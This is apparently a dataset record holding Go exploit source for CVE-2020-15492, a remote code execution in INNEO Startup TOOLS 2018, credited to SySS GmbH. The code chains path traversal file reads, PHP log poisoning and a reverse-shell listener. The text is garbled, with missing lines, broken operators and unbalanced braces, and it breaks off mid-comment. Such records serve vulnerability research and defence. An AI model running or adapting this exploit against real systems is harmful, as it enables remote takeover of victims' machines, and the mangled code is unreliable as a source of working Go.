{
    "text": "vul_name : INNEO Startup TOOLS 2018 M040 13.0.70.3804 Remote Code Execution ， vul_cve : CVE-2020-15492 ， vul_poc :  # Exploit Title : INNEO Startup TOOLS 2018 M040 13.0.70.3804 - Remote Code Execution ，  # Date : 2020-07-23 ，  # Exploit Author : Patrick Hener , SySS GmbH ，  # Many credits go to Dr. Benjamin He , SySS GmbH for helping with php oddities and the powershell payload ，  # Advisory : SYSS-2020-028 (  ，  # Vendor Homepage :  ，  # Version : Startup TOOLS 2017/2018 ，  # Tested on : Windows 10 x64 ，  # CVE : CVE-2020-15492 ， / * This exploit was written by Patrick Hener , SySS GmbH ， package main ， import (  ， \"encoding/base64\" ， \"fmt\" ， _ \"fmt\" ， \"io\" ， \"io/ioutil\" ， \"log\" ， \"net\" ， \"net/http\" ， \"net/url\" ， \"os\" ， \"regexp\" ， \"strconv\" ， \"strings\" ， \"golang.org/x/text/encoding/unicode\" ， type progress struct { ， bytes uint64 ， } ， func usage (  ) { ， fmt.Printf ( \"Usage : %s lhost [ 192.168.x.x ] lport [ 4444 ] url [ installDir [ PROGRA ~ 2/stools ] \\n\\n\" , os.Args [ 0 ]  )  ， os.Exit ( 2 )  ， } ， func readFile ( target string , traversal string , path string )  ( bool , string ) { ， success : = true ， request : = fmt.Sprintf ( \"%s%s%s\" , target , traversal , path )  ， resp , err : = http.Get ( request )  ， fmt.Println ( err )  ， } ， success = false ， } ， defer resp.Body.Close (  )  ， body , err : = ioutil.ReadAll ( resp.Body )  ， fmt.Println ( err )  ， } ， } ， func triggerFile ( target string , traversal string , path string ) { ， request : = fmt.Sprintf ( \"%s%s%s\" , target , traversal , path )  ， _ , _ = http.Get ( request )  ， } ， func poison ( target string , traversal string , path string )  ( bool , string ) { ， success : = true ， request : = fmt.Sprintf ( \"%s%s%s\" , target , traversal , path )  ， resp , err : = http.Get ( request )  ， fmt.Println ( err )  ， os.Exit ( 2 )  ， } ， success = false ， } ， defer resp.Body.Close (  )  ， fmt.Printf ( \" [  *  ] Poisoned : %s\\n\" , path )  ， body , err : = ioutil.ReadAll ( resp.Body )  ， fmt.Println ( err )  ， } ， } ， func parseHostname ( body string ) string { ， re : = regexp.MustCompile ( \"Service hostname : ?. * \" )  ， hostnameRaw : = re.FindAllString ( body , -1 )  ， hostnameSplit : = strings.Split ( hostnameRaw [ 0 ]  , \" : \" )  ， hostnameTrimmed : = strings.TrimSpace ( hostnameSplit [ 1 ]  )  ， hostnameNoNewline : = strings.Replace ( hostnameTrimmed , \"\\n\" , \" , -1 )  ， } ， func customEscape ( sequence string ) string { ， output : = url.PathEscape ( sequence )  ， output = strings.Replace ( output , \"+\" , \"%20\" , -1 )  ， output = strings.Replace ( output , \"=\" , \"%3D\" , -1 )  ， } ， func payloadEscape ( sequence string ) string { ， output : = url.PathEscape ( sequence )  ， output = strings.Replace ( output , \"=\" , \"%3D\" , -1 )  ， } ， func transferStreams ( con net.Conn ) { ， c : = make ( chan progress )  ， / Read from Reader and write to Writer until EOF ， copy : = func ( r io.ReadCloser , w io.WriteCloser ) { ， defer func (  ) { ， r.Close (  )  ， w.Close (  )  ， } (  )  ， n , err : = io.Copy ( w , r )  ， fmt.Printf ( \" [ %s ]  : ERROR : %s\\n\" , con.RemoteAddr (  )  , err )  ， } ， c <- progress{bytes : uint64 ( n ) } ， } ， go copy ( con , os.Stdout )  ， go copy ( os.Stdin , con )  ， p : = <-c ， fmt.Printf ( \" [  *  ]  [ %s ]  : Connection has been closed by remote peer , %d bytes has been received\\n\" , con.RemoteAddr (  )  , p.bytes )  ， p = <-c ， fmt.Printf ( \" [  *  ]  [ %s ]  : Local peer has been stopped , %d bytes has been sent\\n\" , con.RemoteAddr (  )  , p.bytes )  ， } ， func startServer ( addr string ) { ， ln , err : = net.Listen ( \"tcp\" , addr )  ， log.Fatalln ( err )  ， } ， fmt.Printf ( \" [ + ] Now listening on %s\\n\" , addr )  ， con , err : = ln.Accept (  )  ， log.Fatalln ( err )  ， } ， fmt.Printf ( \" [ + ]  [ %s ]  : Connection has been opened. Press 'RETURN' once to start. Enjoy your shell , good sir.\\n\" , con.RemoteAddr (  )  ， transferStreams ( con )  ， } ， func stage1 ( target string , traversal string , installDir string ) string { ， fmt.Printf ( \" [  *  ] Attacking target %s with assumed install path %s\\n\" , target , installDir )  ， fmt.Printf ( \" [  *  ] Trying to read 'sut_server.log' to receive hostname of target at %s%s%s/software/LOG/sut_server.log\\n\" , target , traversal , installDir )  ， path : = fmt.Sprintf ( \"%s/software/LOG/sut_server.log\" , installDir )  ， success , response : = readFile ( target , traversal , path )  ， fmt.Printf ( \" [ - ] It looks like %s%s%s is not there. Provide install_dir to try via args.\\n\" , target , traversal , installDir )  ， os.Exit ( 2 )  ， } ， hostname : = parseHostname ( response )  ， } ， func stage2 ( target string , traversal string , installDir string , payloadFinal string ) { ， / * Stage 2 - poison log with php payload ， Special about that is the length of payload junk has max restriction of about 200 characters ， Thus we are splitting up the payload escaping the trash we don't need like ， the 'n' is nesessary to escape DRIVE : \\ which will be DRIVE : \\n then",
    "time": "2020.08.04"
}